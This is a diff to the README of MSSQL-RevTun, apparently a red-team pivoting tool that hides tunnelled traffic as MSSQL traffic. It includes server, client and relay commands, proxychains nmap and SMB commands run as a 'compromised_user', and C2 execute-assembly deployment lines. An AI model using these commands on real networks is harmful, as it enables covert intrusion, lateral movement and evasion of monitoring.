@@ -1,11 +1,11 @@
-# RevTun
+# MSSQL-RevTun
 
-RevTun is a POC tool for network pivoting. It operates similar to chisel, ligolo and ssh tunneling. The main difference is that it uses the Microsoft SQL Server TDS protocol to make the network traffic look like MSSQL traffic.
+MSSQL-RevTun is a tool for network pivoting. It operates similar to chisel, ligolo and ssh tunneling. The main difference is that it uses the Microsoft SQL Server TDS protocol to make the network traffic look like MSSQL traffic.
 
 It operates in 3 modes:
 - **Server**: Listens on a port (1433 by default). Once it receives a client connection, it opens another port (1080 by default). Through the second port, we can use proxychains/tun2socks to forward all traffic though the client.
 - **Client**: Connects to server or to the relay using authentic MSSQL authentication. Forwards all traffic from the server.
-- **Relay**: Relays the traffic from the client to the server. Use case: the client cannot directly reach the server but can reach the relay machine.
+- **Relay**: Relays the traffic from the client to the server. Use case: the client cannot directly reach the external server but can reach the relay machine.
 
 ## Building
 
@@ -30,34 +30,34 @@ dotnet build -c Release -f net48 -p:Platform=AnyCPU
 
 ### Server
 ```bash
-./revtun server --port 1433 --proxy-port 1080 --password test123
+./revtun server --password test123
 ```
 
 ### Client 
 ```bash
-./revtun client --host server.com --port 1433 --encrypt --password test123
+./revtun client --host target-server.com --password test123
 ```
 
 ### Relay (Traffic Forwarding)
 ```bash
-./revtun relay --host target-server.com --port 1433 --server-port 1433 --debug
+./revtun relay --host target-server.com --debug
 ```
 
 ### Using SOCKS Proxy
 ```bash
-curl --proxy socks5://localhost:1080 http://internal-resource.local
 proxychains nmap -sT 192.168.1.0/24
+proxychains smbclient -U compromised_user //target.internal.fileserver/Share
 ```
 
-## Cobalt Strike Integration
+## C2 Integration (e.g. execute-assembly from Cobalt Strike)
 
 ### Deployment
 ```bash
 # Client from internal network  
-execute-assembly revtun.exe client --host [external-ip] --port 1433 --encrypt --password test123
+execute-assembly revtun.exe client --host [internal-compromised-host/external-sql-server] --password test123
 
 # Relay on pivot host
-execute-assembly revtun.exe relay --host [internal-sql-server] --port 1433 
+execute-assembly revtun.exe relay --host [external-sql-server] 
 ```
 
 ## Command Options
